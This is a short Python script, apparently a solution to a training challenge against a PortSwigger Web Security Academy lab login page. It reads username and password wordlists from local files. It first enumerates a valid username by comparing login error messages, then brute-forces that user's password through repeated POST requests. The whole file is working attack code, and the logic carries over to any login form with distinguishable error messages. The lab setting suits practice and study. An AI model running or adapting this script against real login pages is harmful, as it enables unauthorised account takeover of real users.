import requests

url = 'https://0a1d008e03026346815520dd003f0033.web-security-academy.net/login'
ruta_archivo_usuarios = 'C:\\Users\\Fiore Di Gregorio\\Documents\\Hackmetrics\\Reto-1\\usuarios_noborrar.txt'
ruta_archivo_password = 'C:\\Users\\Fiore Di Gregorio\\Documents\\Hackmetrics\\Reto-1\\passwords_db.txt'
userFound = ""
passwordFound = ""

def leer_archivo(ruta_archivo):
    try:
        with open(ruta_archivo, 'r') as archivo:
            lineas = archivo.readlines()
            lineas = [linea.strip() for linea in lineas]
            return lineas


    except FileNotFoundError:
        print(f"El archivo {ruta_archivo} no fue encontrado.")
        return []
    except Exception as e:
        print(f"Ocurrió un error1" + str(e))
        return []

def atacar(usuarios, passwords):
    global userFound
    global passwordFound
    try:
        for usuario in usuarios:
            find_user(usuario)
        if(userFound != ""):
            for password in passwords:
                find_password(userFound, password)
        if(passwordFound != ""):
            print(f"Usuario y password encontrados: " + userFound + " " + passwordFound)

    except Exception as e:
        print(f"Ocurrió un error2" + str(e))
        return

def find_password(usuario, password):
    global passwordFound
    if(passwordFound != ""):
        return
    try:
        datos = {'username': usuario, 'password': password}
        headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Hacking/1.0'}
        respuesta = requests.post(url, data=datos, headers=headers)
        if "Incorrect password" not in respuesta.text:
            print(f"Password ENCONTRADO: " + password)
            passwordFound = password
        else:
            print(f'Password incorrecto para usuario'+ ' ' + usuario)

    except Exception as e:
        print(f"Ocurrió un error3: " + str(e))
        return

def find_user(usuario):
    global userFound
    if(userFound != ""):
        return
    datos = {'username': usuario, 'password': 'asd'}
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Hacking/1.0'}
    respuesta = requests.post(url, data=datos, headers=headers)

    if "Invalid username" not in respuesta.text:
        print(f"Usuario ENCONTRADO: " + usuario)
        userFound = usuario
    else:
        print(f"Usuario incorrecto")

usuarios = leer_archivo(ruta_archivo_usuarios)
passwords = leer_archivo(ruta_archivo_password)

atacar(usuarios, passwords)
